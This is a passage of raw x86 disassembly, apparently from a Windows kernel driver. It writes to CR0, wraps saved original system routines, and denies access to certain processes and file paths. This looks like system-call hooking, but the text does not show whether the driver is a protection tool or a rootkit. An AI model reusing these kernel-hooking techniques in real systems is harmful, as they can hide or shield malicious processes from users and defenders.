   14560:	mov    DWORD PTR [esi],0x8c2c033
   14566:	lea    eax,[esi+0x4]
   14569:	mov    DWORD PTR [eax],ebx
   1456b:	mov    DWORD PTR [eax+0x4],ebx
   1456e:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   14575:	jmp    0x1458a
   14577:	xor    eax,eax
   14579:	inc    eax
   1457a:	ret    
   1457b:	mov    esp,DWORD PTR [ebp-0x18]
   1457e:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   14585:	mov    edi,DWORD PTR [ebp+0x8]
   14588:	xor    ebx,ebx
   1458a:	mov    eax,DWORD PTR [ebp-0x2c]
   1458d:	mov    cr0,eax
   14590:	mov    eax,DWORD PTR [ebp+0x10]
   14593:	test   WORD PTR [eax],0x100
   14598:	jne    0x146d9
   1459e:	push   0x1a6c4
   145a3:	push   edi
   145a4:	call   DWORD PTR ds:0x1b1c8
   145aa:	pop    ecx
   145ab:	pop    ecx
   145ac:	test   eax,eax
   145ae:	je     0x146d9
   145b4:	mov    ecx,DWORD PTR [ebp+0xc]
   145b7:	cmp    ecx,ebx
   145b9:	je     0x146d9
   145bf:	xor    eax,eax
   145c1:	lea    edi,[ebp-0x48]
   145c4:	stos   DWORD PTR es:[edi],eax
   145c5:	stos   DWORD PTR es:[edi],eax
   145c6:	mov    DWORD PTR [ebp-0x48],ecx
   145c9:	mov    DWORD PTR [ebp-0x60],0x18
   145d0:	mov    DWORD PTR [ebp-0x5c],ebx
   145d3:	mov    DWORD PTR [ebp-0x54],0x200
   145da:	mov    DWORD PTR [ebp-0x58],ebx
   145dd:	mov    DWORD PTR [ebp-0x50],ebx
   145e0:	mov    DWORD PTR [ebp-0x4c],ebx
   145e3:	lea    eax,[ebp-0x48]
   145e6:	push   eax
   145e7:	lea    eax,[ebp-0x60]
   145ea:	push   eax
   145eb:	push   0x1f0fff
   145f0:	lea    eax,[ebp-0x24]
   145f3:	push   eax
   145f4:	call   DWORD PTR ds:0x1b1f0
   145fa:	test   eax,eax
   145fc:	jne    0x146d9
   14602:	push   ebx
   14603:	push   DWORD PTR [ebp-0x24]
   14606:	call   DWORD PTR ds:0x1b1ec
   1460c:	push   DWORD PTR [ebp-0x24]
   1460f:	call   DWORD PTR ds:0x1b180
   14615:	jmp    0x146db
   1461a:	cmp    DWORD PTR [ebp-0x28],0x0
   1461e:	je     0x146a9
   14624:	cmp    DWORD PTR [ebp-0x30],0x0
   14628:	je     0x146a9
   1462a:	push   0x100
   1462f:	push   0x1
   14631:	call   DWORD PTR ds:0x1b124
   14637:	mov    edi,eax
   14639:	test   edi,edi
   1463b:	je     0x146a9
   1463d:	push   0x100
   14642:	xor    ebx,ebx
   14644:	push   ebx
   14645:	push   edi
   14646:	call   0x1a1b0
   1464b:	add    esp,0xc
   1464e:	mov    esi,DWORD PTR [ebp-0x28]
   14651:	mov    eax,edi
   14653:	sub    eax,esi
   14655:	mov    DWORD PTR [ebp+0x8],eax
   14658:	mov    eax,0x100
   1465d:	cmp    ebx,eax
   1465f:	jae    0x14693
   14661:	cmp    ebx,DWORD PTR [ebp-0x30]
   14664:	jae    0x14693
   14666:	mov    ecx,DWORD PTR [ebp+0x10]
   14669:	test   DWORD PTR [ecx],eax
   1466b:	je     0x14676
   1466d:	push   esi
   1466e:	call   DWORD PTR ds:0x1b130
   14674:	jmp    0x1467e
   14676:	push   0x1
   14678:	push   esi
   14679:	call   0x10a0a
   1467e:	movzx  eax,al
   14681:	test   eax,eax
   14683:	je     0x1468d
   14685:	mov    al,BYTE PTR [esi]
   14687:	mov    ecx,DWORD PTR [ebp+0x8]
   1468a:	mov    BYTE PTR [ecx+esi*1],al
   1468d:	inc    esi
   1468e:	inc    ebx
   1468f:	test   esi,esi
   14691:	jne    0x14658
   14693:	mov    DWORD PTR [ebp-0x3c],ebx
   14696:	push   ebx
   14697:	push   edi
   14698:	call   0x10b16
   1469d:	mov    DWORD PTR [ebp-0x40],eax
   146a0:	push   0x0
   146a2:	push   edi
   146a3:	call   DWORD PTR ds:0x1b278
   146a9:	push   DWORD PTR [ebp-0x34]
   146ac:	push   DWORD PTR [ebp-0x3c]
   146af:	push   DWORD PTR [ebp-0x40]
   146b2:	push   DWORD PTR [ebp-0x20]
   146b5:	mov    eax,DWORD PTR [ebp+0x10]
   146b8:	push   DWORD PTR [eax+0xc]
   146bb:	push   DWORD PTR [ebp-0x28]
   146be:	push   DWORD PTR [eax+0x4]
   146c1:	push   DWORD PTR [ebp+0xc]
   146c4:	push   0x0
   146c6:	mov    eax,DWORD PTR [eax]
   146c8:	and    eax,0x100
   146cd:	neg    eax
   146cf:	sbb    eax,eax
   146d1:	inc    eax
   146d2:	inc    eax
   146d3:	push   eax
   146d4:	call   0x11e38
   146d9:	xor    ebx,ebx
   146db:	cmp    DWORD PTR [ebp-0x1c],ebx
   146de:	je     0x146ea
   146e0:	push   ebx
   146e1:	push   DWORD PTR [ebp-0x1c]
   146e4:	call   DWORD PTR ds:0x1b278
   146ea:	cmp    DWORD PTR [ebp-0x20],ebx
   146ed:	je     0x146f9
   146ef:	push   ebx
   146f0:	push   DWORD PTR [ebp-0x20]
   146f3:	call   DWORD PTR ds:0x1b278
   146f9:	call   0x1a20d
   146fe:	ret    0xc
   14701:	int3   
   14702:	int3   
   14703:	int3   
   14704:	int3   
   14705:	int3   
   14706:	mov    edi,edi
   14708:	push   ebp
   14709:	mov    ebp,esp
   1470b:	sub    esp,0x30
   1470e:	mov    eax,ds:0x1bb6c
   14713:	xor    eax,ebp
   14715:	mov    DWORD PTR [ebp-0x4],eax
   14718:	mov    ecx,DWORD PTR [ebp+0xc]
   1471b:	push   ebx
   1471c:	push   edi
   1471d:	xor    ebx,ebx
   1471f:	xor    eax,eax
   14721:	cmp    BYTE PTR [ebp+0x10],bl
   14724:	mov    WORD PTR [ebp-0x14],bx
   14728:	lea    edi,[ebp-0x12]
   1472b:	stos   DWORD PTR es:[edi],eax
   1472c:	stos   DWORD PTR es:[edi],eax
   1472d:	stos   DWORD PTR es:[edi],eax
   1472e:	mov    DWORD PTR [ebp-0x18],ecx
   14731:	stos   WORD PTR es:[edi],ax
   14733:	mov    DWORD PTR [ebp-0x2c],ebx
   14736:	mov    DWORD PTR [ebp-0x24],ebx
   14739:	mov    DWORD PTR [ebp-0x1c],ebx
   1473c:	jne    0x14749
   1473e:	push   ecx
   1473f:	push   0x2
   14741:	call   0x11e10
   14746:	mov    DWORD PTR [ebp-0x2c],eax
   14749:	cmp    BYTE PTR ds:0x1bf8e,bl
   1474f:	je     0x1492a
   14755:	mov    edi,DWORD PTR ds:0x1b124
   1475b:	push   esi
   1475c:	mov    esi,0x208
   14761:	push   esi
   14762:	push   0x1
   14764:	call   edi
   14766:	push   esi
   14767:	push   0x1
   14769:	mov    DWORD PTR [ebp-0x20],eax
   1476c:	call   edi
   1476e:	push   esi
   1476f:	push   0x1
   14771:	mov    DWORD PTR [ebp-0x28],eax
   14774:	call   edi
   14776:	cmp    DWORD PTR [ebp-0x20],ebx
   14779:	mov    edi,eax
   1477b:	mov    DWORD PTR [ebp-0x30],edi
   1477e:	je     0x1490e
   14784:	cmp    DWORD PTR [ebp-0x28],ebx
   14787:	je     0x14904
   1478d:	cmp    edi,ebx
   1478f:	je     0x14904
   14795:	push   esi
   14796:	push   ebx
   14797:	push   DWORD PTR [ebp-0x20]
   1479a:	call   0x1a1b0
   1479f:	push   esi
   147a0:	push   ebx
   147a1:	push   DWORD PTR [ebp-0x28]
   147a4:	call   0x1a1b0
   147a9:	push   esi
   147aa:	push   ebx
   147ab:	push   edi
   147ac:	call   0x1a1b0
   147b1:	add    esp,0x24
   147b4:	lea    eax,[ebp-0x1c]
   147b7:	push   eax
   147b8:	push   DWORD PTR [ebp-0x18]
   147bb:	call   DWORD PTR ds:0x1b27c
   147c1:	test   eax,eax
   147c3:	jne    0x148d7
   147c9:	cmp    DWORD PTR [ebp-0x1c],ebx
   147cc:	je     0x148d7
   147d2:	lea    eax,[ebp-0x24]
   147d5:	push   eax
   147d6:	push   ebx
   147d7:	push   ebx
   147d8:	push   ebx
   147d9:	push   ebx
   147da:	push   0x200
   147df:	push   DWORD PTR [ebp-0x1c]
   147e2:	call   DWORD PTR ds:0x1b1f4
   147e8:	test   eax,eax
   147ea:	jne    0x148ce
   147f0:	cmp    DWORD PTR [ebp-0x24],ebx
   147f3:	je     0x148ce
   147f9:	cmp    BYTE PTR ds:0x1bf91,bl
   147ff:	je     0x14846
   14801:	lea    eax,[ebp-0x2c]
   14804:	push   eax
   14805:	push   esi
   14806:	push   DWORD PTR [ebp-0x20]
   14809:	push   0x1b
   1480b:	push   DWORD PTR [ebp-0x24]
   1480e:	call   DWORD PTR ds:0x1b150
   14814:	test   eax,eax
   14816:	jne    0x148c2
   1481c:	push   ebx
   1481d:	push   ebx
   1481e:	push   DWORD PTR [ebp-0x20]
   14821:	push   0x104
   14826:	push   edi
   14827:	call   0x12610
   1482c:	cmp    BYTE PTR ds:0x1bf8e,bl
   14832:	je     0x148c2
   14838:	push   0x1db80
   1483d:	push   edi
   1483e:	call   DWORD PTR ds:0x1b168
   14844:	jmp    0x148a5
   14846:	mov    eax,DWORD PTR [ebp-0x1c]
   14849:	mov    ecx,DWORD PTR ds:0x1bfb0
   1484f:	add    ecx,eax
   14851:	push   ecx
   14852:	call   DWORD PTR ds:0x1b130
   14858:	test   al,al
   1485a:	je     0x148c2
   1485c:	mov    ecx,DWORD PTR ds:0x1bfb0
   14862:	xor    eax,eax
   14864:	lea    edi,[ebp-0x14]
   14867:	stos   DWORD PTR es:[edi],eax
   14868:	stos   DWORD PTR es:[edi],eax
   14869:	stos   DWORD PTR es:[edi],eax
   1486a:	stos   DWORD PTR es:[edi],eax
   1486b:	mov    eax,DWORD PTR [ebp-0x1c]
   1486e:	add    ecx,eax
   14870:	push   0xf
   14872:	push   ecx
   14873:	lea    eax,[ebp-0x14]
   14876:	push   eax
   14877:	call   DWORD PTR ds:0x1b1a4
   1487d:	lea    eax,[ebp-0x14]
   14880:	push   0x1a598
   14885:	push   eax
   14886:	call   DWORD PTR ds:0x1b140
   1488c:	add    esp,0x14
   1488f:	cmp    eax,ebx
   14891:	je     0x14896
   14893:	mov    BYTE PTR [eax+0x4],bl
   14896:	lea    eax,[ebp-0x14]
   14899:	push   0x1a69c
   1489e:	push   eax
   1489f:	call   DWORD PTR ds:0x1b1d8
   148a5:	test   eax,eax
   148a7:	pop    ecx
   148a8:	pop    ecx
   148a9:	jne    0x148c2
   148ab:	cmp    BYTE PTR [ebp+0x10],bl
   148ae:	push   ebx
   148af:	push   DWORD PTR [ebp-0x18]
   148b2:	push   0x2
   148b4:	je     0x148bd
   148b6:	call   0x11a7a
   148bb:	jmp    0x148c2
   148bd:	call   0x119ac
   148c2:	push   DWORD PTR [ebp-0x24]
   148c5:	call   DWORD PTR ds:0x1b180
   148cb:	mov    edi,DWORD PTR [ebp-0x30]
   148ce:	mov    ecx,DWORD PTR [ebp-0x1c]
   148d1:	call   DWORD PTR ds:0x1b284
   148d7:	cmp    WORD PTR [edi],bx
   148da:	je     0x14904
   148dc:	cmp    BYTE PTR [ebp+0x10],bl
   148df:	je     0x148f7
   148e1:	push   ebx
   148e2:	push   ebx
   148e3:	push   ebx
   148e4:	push   edi
   148e5:	push   ebx
   148e6:	push   ebx
   148e7:	push   ebx
   148e8:	push   DWORD PTR [ebp-0x18]
   148eb:	push   DWORD PTR [ebp+0x8]
   148ee:	push   0x3
   148f0:	call   0x11e38
   148f5:	jmp    0x14904
   148f7:	push   DWORD PTR [ebp-0x18]
   148fa:	push   0x3
   148fc:	call   0x11e10
   14901:	mov    DWORD PTR [ebp-0x2c],eax
   14904:	push   ebx
   14905:	push   DWORD PTR [ebp-0x20]
   14908:	call   DWORD PTR ds:0x1b278
   1490e:	cmp    DWORD PTR [ebp-0x28],ebx
   14911:	pop    esi
   14912:	je     0x1491e
   14914:	push   ebx
   14915:	push   DWORD PTR [ebp-0x28]
   14918:	call   DWORD PTR ds:0x1b278
   1491e:	cmp    edi,ebx
   14920:	je     0x1492a
   14922:	push   ebx
   14923:	push   edi
   14924:	call   DWORD PTR ds:0x1b278
   1492a:	mov    ecx,DWORD PTR [ebp-0x4]
   1492d:	pop    edi
   1492e:	xor    ecx,ebp
   14930:	pop    ebx
   14931:	call   0x1a164
   14936:	leave  
   14937:	ret    0xc
   1493a:	int3   
   1493b:	int3   
   1493c:	int3   
   1493d:	int3   
   1493e:	int3   
   1493f:	int3   
   14940:	xor    eax,eax
   14942:	ret    
   14943:	int3   
   14944:	int3   
   14945:	int3   
   14946:	int3   
   14947:	int3   
   14948:	push   0x30
   1494a:	push   0x1b4f0
   1494f:	call   0x1a1c8
   14954:	mov    BYTE PTR [ebp-0x19],0x0
   14958:	xor    esi,esi
   1495a:	mov    DWORD PTR [ebp-0x30],esi
   1495d:	mov    DWORD PTR [ebp-0x28],esi
   14960:	mov    DWORD PTR [ebp-0x20],esi
   14963:	mov    DWORD PTR [ebp-0x24],esi
   14966:	mov    DWORD PTR [ebp-0x2c],esi
   14969:	mov    ebx,DWORD PTR [ebp+0x14]
   1496c:	push   ebx
   1496d:	push   DWORD PTR [ebp+0x10]
   14970:	push   DWORD PTR [ebp+0xc]
   14973:	push   DWORD PTR [ebp+0x8]
   14976:	call   DWORD PTR ds:0x1c078
   1497c:	mov    DWORD PTR [ebp+0x10],eax
   1497f:	cmp    eax,esi
   14981:	jne    0x14bd7
   14987:	mov    esi,0x208
   1498c:	push   esi
   1498d:	push   0x1
   1498f:	mov    edi,DWORD PTR ds:0x1b124
   14995:	call   edi
   14997:	mov    DWORD PTR [ebp-0x20],eax
   1499a:	push   esi
   1499b:	push   0x1
   1499d:	call   edi
   1499f:	mov    DWORD PTR [ebp-0x24],eax
   149a2:	push   esi
   149a3:	push   0x1
   149a5:	call   edi
   149a7:	mov    DWORD PTR [ebp-0x2c],eax
   149aa:	xor    edi,edi
   149ac:	cmp    DWORD PTR [ebp-0x20],edi
   149af:	je     0x14bd7
   149b5:	cmp    DWORD PTR [ebp-0x24],edi
   149b8:	je     0x14bd7
   149be:	cmp    eax,edi
   149c0:	je     0x14bd7
   149c6:	push   esi
   149c7:	push   edi
   149c8:	push   DWORD PTR [ebp-0x20]
   149cb:	call   0x1a1b0
   149d0:	push   esi
   149d1:	push   edi
   149d2:	push   DWORD PTR [ebp-0x24]
   149d5:	call   0x1a1b0
   149da:	push   esi
   149db:	push   edi
   149dc:	push   DWORD PTR [ebp-0x2c]
   149df:	call   0x1a1b0
   149e4:	add    esp,0x24
   149e7:	mov    edi,DWORD PTR [ebx]
   149e9:	and    DWORD PTR [ebp+0x14],0x0
   149ed:	call   DWORD PTR ds:0x1b154
   149f3:	call   DWORD PTR ds:0x1b208
   149f9:	push   0x0
   149fb:	push   eax
   149fc:	push   0x3
   149fe:	pop    ebx
   149ff:	push   ebx
   14a00:	call   0x11902
   14a05:	test   eax,eax
   14a07:	je     0x14a0e
   14a09:	mov    DWORD PTR [ebp+0x14],ebx
   14a0c:	jmp    0x14a3a
   14a0e:	push   0x0
   14a10:	push   edi
   14a11:	xor    ebx,ebx
   14a13:	inc    ebx
   14a14:	push   ebx
   14a15:	call   0x11902
   14a1a:	test   eax,eax
   14a1c:	jne    0x14a09
   14a1e:	push   eax
   14a1f:	push   edi
   14a20:	push   0x2
   14a22:	pop    edi
   14a23:	push   edi
   14a24:	call   0x11902
   14a29:	test   eax,eax
   14a2b:	je     0x14a30
   14a2d:	mov    DWORD PTR [ebp+0x14],edi
   14a30:	cmp    DWORD PTR [ebp+0x14],0x0
   14a34:	je     0x14bd7
   14a3a:	mov    BYTE PTR [ebp-0x19],0x1
   14a3e:	push   DWORD PTR [ebp-0x24]
   14a41:	call   0x10d12
   14a46:	test   al,al
   14a48:	je     0x14a54
   14a4a:	push   DWORD PTR [ebp-0x24]
   14a4d:	call   DWORD PTR ds:0x1b204
   14a53:	pop    ecx
   14a54:	cmp    BYTE PTR ds:0x1bf91,0x0
   14a5b:	je     0x14aca
   14a5d:	lea    eax,[ebp+0xc]
   14a60:	push   eax
   14a61:	push   esi
   14a62:	push   DWORD PTR [ebp-0x2c]
   14a65:	push   0x1b
   14a67:	push   0xffffffff
   14a69:	mov    ebx,DWORD PTR ds:0x1b150
   14a6f:	call   ebx
   14a71:	test   eax,eax
   14a73:	jne    0x14a7f
   14a75:	push   DWORD PTR [ebp-0x2c]
   14a78:	call   DWORD PTR ds:0x1b204
   14a7e:	pop    ecx
   14a7f:	push   0x5c
   14a81:	push   DWORD PTR [ebp-0x2c]
   14a84:	mov    edi,DWORD PTR ds:0x1b16c
   14a8a:	call   edi
   14a8c:	pop    ecx
   14a8d:	pop    ecx
   14a8e:	lea    eax,[ebp+0xc]
   14a91:	push   eax
   14a92:	push   esi
   14a93:	push   DWORD PTR [ebp-0x20]
   14a96:	push   0x1b
   14a98:	mov    eax,DWORD PTR [ebp+0x8]
   14a9b:	push   DWORD PTR [eax]
   14a9d:	call   ebx
   14a9f:	test   eax,eax
   14aa1:	jne    0x14aad
   14aa3:	push   DWORD PTR [ebp-0x20]
   14aa6:	call   DWORD PTR ds:0x1b204
   14aac:	pop    ecx
   14aad:	push   0x5c
   14aaf:	push   DWORD PTR [ebp-0x20]
   14ab2:	call   edi
   14ab4:	pop    ecx
   14ab5:	pop    ecx
   14ab6:	mov    DWORD PTR [ebp-0x28],eax
   14ab9:	test   eax,eax
   14abb:	je     0x14b68
   14ac1:	add    DWORD PTR [ebp-0x28],0x2
   14ac5:	jmp    0x14b68
   14aca:	cmp    BYTE PTR ds:0x1bf92,0x0
   14ad1:	je     0x14b68
   14ad7:	xor    esi,esi
   14ad9:	push   esi
   14ada:	lea    eax,[ebp-0x30]
   14add:	push   eax
   14ade:	push   esi
   14adf:	push   esi
   14ae0:	push   0x1f0fff
   14ae5:	mov    eax,DWORD PTR [ebp+0x8]
   14ae8:	push   DWORD PTR [eax]
   14aea:	call   DWORD PTR ds:0x1b19c
   14af0:	cmp    eax,esi
   14af2:	jne    0x14b68
   14af4:	mov    eax,DWORD PTR [ebp-0x30]
   14af7:	cmp    eax,esi
   14af9:	je     0x14b68
   14afb:	mov    DWORD PTR [ebp-0x4],esi
   14afe:	add    eax,0x1fc
   14b03:	push   eax
   14b04:	lea    eax,[ebp-0x40]
   14b07:	push   eax
   14b08:	call   DWORD PTR ds:0x1b200
   14b0e:	push   0x1
   14b10:	lea    eax,[ebp-0x40]
   14b13:	push   eax
   14b14:	lea    eax,[ebp-0x38]
   14b17:	push   eax
   14b18:	call   DWORD PTR ds:0x1b1fc
   14b1e:	test   eax,eax
   14b20:	jne    0x14b58
   14b22:	mov    esi,DWORD PTR [ebp-0x20]
   14b25:	mov    DWORD PTR [ebp-0x28],esi
   14b28:	movzx  eax,WORD PTR [ebp-0x38]
   14b2c:	push   eax
   14b2d:	push   DWORD PTR [ebp-0x34]
   14b30:	push   esi
   14b31:	call   DWORD PTR ds:0x1b194
   14b37:	push   esi
   14b38:	call   DWORD PTR ds:0x1b204
   14b3e:	add    esp,0x10
   14b41:	lea    eax,[ebp-0x38]
   14b44:	push   eax
   14b45:	call   DWORD PTR ds:0x1b1f8
   14b4b:	jmp    0x14b58
   14b4d:	xor    eax,eax
   14b4f:	inc    eax
   14b50:	ret    
   14b51:	mov    esp,DWORD PTR [ebp-0x18]
   14b54:	and    DWORD PTR [ebp-0x28],0x0
   14b58:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   14b5f:	mov    ecx,DWORD PTR [ebp-0x30]
   14b62:	call   DWORD PTR ds:0x1b284
   14b68:	mov    eax,DWORD PTR [ebp+0x14]
   14b6b:	dec    eax
   14b6c:	je     0x14bd0
   14b6e:	dec    eax
   14b6f:	jne    0x14bd7
   14b71:	push   0x1a6c4
   14b76:	mov    edi,DWORD PTR [ebp-0x24]
   14b79:	push   edi
   14b7a:	call   DWORD PTR ds:0x1b1c8
   14b80:	pop    ecx
   14b81:	pop    ecx
   14b82:	test   eax,eax
   14b84:	je     0x14ba0
   14b86:	cmp    DWORD PTR [ebp-0x28],0x0
   14b8a:	je     0x14ba0
   14b8c:	push   edi
   14b8d:	push   DWORD PTR [ebp-0x28]
   14b90:	mov    esi,DWORD PTR ds:0x1b168
   14b96:	call   esi
   14b98:	pop    ecx
   14b99:	pop    ecx
   14b9a:	test   eax,eax
   14b9c:	jne    0x14bd0
   14b9e:	jmp    0x14ba6
   14ba0:	mov    esi,DWORD PTR ds:0x1b168
   14ba6:	push   0x1ac00
   14bab:	push   edi
   14bac:	call   esi
   14bae:	pop    ecx
   14baf:	pop    ecx
   14bb0:	test   eax,eax
   14bb2:	je     0x14bd0
   14bb4:	push   0x1abea
   14bb9:	push   edi
   14bba:	call   esi
   14bbc:	pop    ecx
   14bbd:	pop    ecx
   14bbe:	test   eax,eax
   14bc0:	je     0x14bd0
   14bc2:	push   0x1abd2
   14bc7:	push   edi
   14bc8:	call   esi
   14bca:	pop    ecx
   14bcb:	pop    ecx
   14bcc:	test   eax,eax
   14bce:	jne    0x14bd7
   14bd0:	mov    DWORD PTR [ebp+0x10],0xc0000022
   14bd7:	xor    esi,esi
   14bd9:	cmp    DWORD PTR [ebp-0x20],esi
   14bdc:	je     0x14be8
   14bde:	push   esi
   14bdf:	push   DWORD PTR [ebp-0x20]
   14be2:	call   DWORD PTR ds:0x1b278
   14be8:	cmp    DWORD PTR [ebp-0x24],esi
   14beb:	je     0x14bf7
   14bed:	push   esi
   14bee:	push   DWORD PTR [ebp-0x24]
   14bf1:	call   DWORD PTR ds:0x1b278
   14bf7:	cmp    DWORD PTR [ebp-0x2c],esi
   14bfa:	je     0x14c06
   14bfc:	push   esi
   14bfd:	push   DWORD PTR [ebp-0x2c]
   14c00:	call   DWORD PTR ds:0x1b278
   14c06:	cmp    BYTE PTR [ebp-0x19],0x0
   14c0a:	je     0x14c40
   14c0c:	cmp    DWORD PTR [ebp+0x10],0xc0000022
   14c13:	jne    0x14c40
   14c15:	mov    esi,DWORD PTR [ebp+0x8]
   14c18:	mov    eax,DWORD PTR [esi]
   14c1a:	cmp    eax,0xffffffff
   14c1d:	je     0x14c40
   14c1f:	mov    DWORD PTR [ebp-0x4],0x1
   14c26:	push   eax
   14c27:	call   DWORD PTR ds:0x1b180
   14c2d:	or     DWORD PTR [esi],0xffffffff
   14c30:	jmp    0x14c39
   14c32:	xor    eax,eax
   14c34:	inc    eax
   14c35:	ret    
   14c36:	mov    esp,DWORD PTR [ebp-0x18]
   14c39:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   14c40:	mov    eax,DWORD PTR [ebp+0x10]
   14c43:	call   0x1a20d
   14c48:	ret    0x10
   14c4b:	int3   
   14c4c:	int3   
   14c4d:	int3   
   14c4e:	int3   
   14c4f:	int3   
   14c50:	push   0x238
   14c55:	push   0x1b518
   14c5a:	call   0x1a38c
   14c5f:	mov    esi,DWORD PTR [ebp+0x8]
   14c62:	mov    eax,DWORD PTR [ebp+0x10]
   14c65:	mov    ecx,DWORD PTR [ebp+0x14]
   14c68:	xor    ebx,ebx
   14c6a:	mov    BYTE PTR [ebp-0x225],bl
   14c70:	push   ecx
   14c71:	push   eax
   14c72:	push   DWORD PTR [ebp+0xc]
   14c75:	push   esi
   14c76:	call   DWORD PTR ds:0x1c070
   14c7c:	mov    DWORD PTR [ebp-0x22c],eax
   14c82:	cmp    eax,ebx
   14c84:	jne    0x14d4b
   14c8a:	push   ebx
   14c8b:	push   0x1c
   14c8d:	lea    eax,[ebp-0x248]
   14c93:	push   eax
   14c94:	push   ebx
   14c95:	push   DWORD PTR [esi]
   14c97:	call   0x109c0
   14c9c:	cmp    eax,ebx
   14c9e:	jne    0x14d4b
   14ca4:	call   DWORD PTR ds:0x1b154
   14caa:	call   DWORD PTR ds:0x1b208
   14cb0:	mov    edi,eax
   14cb2:	cmp    edi,DWORD PTR [ebp-0x23c]
   14cb8:	je     0x14d4b
   14cbe:	push   ebx
   14cbf:	push   DWORD PTR [ebp-0x23c]
   14cc5:	push   0x3
   14cc7:	call   0x11902
   14ccc:	test   eax,eax
   14cce:	jne    0x14ce2
   14cd0:	push   ebx
   14cd1:	push   DWORD PTR [ebp-0x240]
   14cd7:	push   0x1
   14cd9:	call   0x11902
   14cde:	test   eax,eax
   14ce0:	je     0x14d4b
   14ce2:	mov    BYTE PTR [ebp-0x225],0x1
   14ce9:	push   0x208
   14cee:	push   ebx
   14cef:	lea    eax,[ebp-0x224]
   14cf5:	push   eax
   14cf6:	call   0x1a1b0
   14cfb:	add    esp,0xc
   14cfe:	lea    eax,[ebp-0x224]
   14d04:	push   eax
   14d05:	call   0x10d12
   14d0a:	test   al,al
   14d0c:	je     0x14d1c
   14d0e:	lea    eax,[ebp-0x224]
   14d14:	push   eax
   14d15:	call   DWORD PTR ds:0x1b204
   14d1b:	pop    ecx
   14d1c:	push   0x1ac1a
   14d21:	lea    eax,[ebp-0x224]
   14d27:	push   eax
   14d28:	call   DWORD PTR ds:0x1b1c8
   14d2e:	pop    ecx
   14d2f:	pop    ecx
   14d30:	test   eax,eax
   14d32:	jne    0x14d4b
   14d34:	push   ebx
   14d35:	push   edi
   14d36:	push   0x3
   14d38:	call   0x11902
   14d3d:	test   eax,eax
   14d3f:	jne    0x14d4b
   14d41:	mov    DWORD PTR [ebp-0x22c],0xc0000022
   14d4b:	cmp    BYTE PTR [ebp-0x225],bl
   14d51:	je     0x14d83
   14d53:	cmp    DWORD PTR [ebp-0x22c],0xc0000022
   14d5d:	jne    0x14d83
   14d5f:	mov    eax,DWORD PTR [esi]
   14d61:	cmp    eax,0xffffffff
   14d64:	je     0x14d83
   14d66:	mov    DWORD PTR [ebp-0x4],ebx
   14d69:	push   eax
   14d6a:	call   DWORD PTR ds:0x1b180
   14d70:	or     DWORD PTR [esi],0xffffffff
   14d73:	jmp    0x14d7c
   14d75:	xor    eax,eax
   14d77:	inc    eax
   14d78:	ret    
   14d79:	mov    esp,DWORD PTR [ebp-0x18]
   14d7c:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   14d83:	mov    eax,DWORD PTR [ebp-0x22c]
   14d89:	call   0x1a3d4
   14d8e:	ret    0x10
   14d91:	int3   
   14d92:	int3   
   14d93:	int3   
   14d94:	int3   
   14d95:	int3   
   14d96:	push   0x18
   14d98:	push   0x1b538
   14d9d:	call   0x1a1c8
   14da2:	mov    BYTE PTR [ebp-0x19],0x0
   14da6:	xor    esi,esi
   14da8:	mov    DWORD PTR [ebp-0x24],esi
   14dab:	mov    DWORD PTR [ebp-0x20],esi
   14dae:	mov    DWORD PTR [ebp-0x28],esi
   14db1:	push   DWORD PTR [ebp+0x30]
   14db4:	push   DWORD PTR [ebp+0x2c]
   14db7:	push   DWORD PTR [ebp+0x28]
   14dba:	push   DWORD PTR [ebp+0x24]
   14dbd:	push   DWORD PTR [ebp+0x20]
   14dc0:	push   DWORD PTR [ebp+0x1c]
   14dc3:	push   DWORD PTR [ebp+0x18]
   14dc6:	push   DWORD PTR [ebp+0x14]
   14dc9:	mov    ebx,DWORD PTR [ebp+0x10]
   14dcc:	push   ebx
   14dcd:	push   DWORD PTR [ebp+0xc]
   14dd0:	push   DWORD PTR [ebp+0x8]
   14dd3:	call   DWORD PTR ds:0x1c074
   14dd9:	mov    DWORD PTR [ebp+0x30],eax
   14ddc:	cmp    eax,esi
   14dde:	jne    0x1505b
   14de4:	mov    esi,0x208
   14de9:	push   esi
   14dea:	push   0x1
   14dec:	mov    edi,DWORD PTR ds:0x1b124
   14df2:	call   edi
   14df4:	mov    DWORD PTR [ebp-0x24],eax
   14df7:	push   esi
   14df8:	push   0x1
   14dfa:	call   edi
   14dfc:	mov    DWORD PTR [ebp-0x20],eax
   14dff:	push   esi
   14e00:	push   0x1
   14e02:	call   edi
   14e04:	mov    DWORD PTR [ebp-0x28],eax
   14e07:	xor    edi,edi
   14e09:	cmp    DWORD PTR [ebp-0x24],edi
   14e0c:	je     0x1505b
   14e12:	cmp    DWORD PTR [ebp-0x20],edi
   14e15:	je     0x1505b
   14e1b:	cmp    eax,edi
   14e1d:	je     0x1505b
   14e23:	push   esi
   14e24:	push   edi
   14e25:	push   DWORD PTR [ebp-0x24]
   14e28:	call   0x1a1b0
   14e2d:	push   esi
   14e2e:	push   edi
   14e2f:	push   DWORD PTR [ebp-0x20]
   14e32:	call   0x1a1b0
   14e37:	push   esi
   14e38:	push   edi
   14e39:	push   DWORD PTR [ebp-0x28]
   14e3c:	call   0x1a1b0
   14e41:	add    esp,0x24
   14e44:	mov    eax,0xc0000001
   14e49:	cmp    ebx,edi
   14e4b:	je     0x14e9a
   14e4d:	mov    ecx,DWORD PTR [ebx+0x8]
   14e50:	cmp    ecx,edi
   14e52:	je     0x14e9a
   14e54:	cmp    WORD PTR [ecx],di
   14e57:	je     0x14e9a
   14e59:	mov    ecx,DWORD PTR [ecx+0x4]
   14e5c:	cmp    ecx,edi
   14e5e:	je     0x14e9a
   14e60:	cmp    WORD PTR [ecx],0x5c
   14e64:	jne    0x14e9a
   14e66:	cmp    WORD PTR [ecx+0x2],0x3f
   14e6b:	jne    0x14e9a
   14e6d:	cmp    WORD PTR [ecx+0x4],0x3f
   14e72:	jne    0x14e9a
   14e74:	cmp    WORD PTR [ecx+0x6],0x5c
   14e79:	jne    0x14e9a
   14e7b:	cmp    WORD PTR [ecx+0xa],0x3a
   14e80:	jne    0x14e9a
   14e82:	mov    eax,DWORD PTR [ebx+0x8]
   14e85:	push   edi
   14e86:	movzx  ecx,WORD PTR [eax]
   14e89:	push   ecx
   14e8a:	push   DWORD PTR [eax+0x4]
   14e8d:	push   0x104
   14e92:	push   DWORD PTR [ebp-0x24]
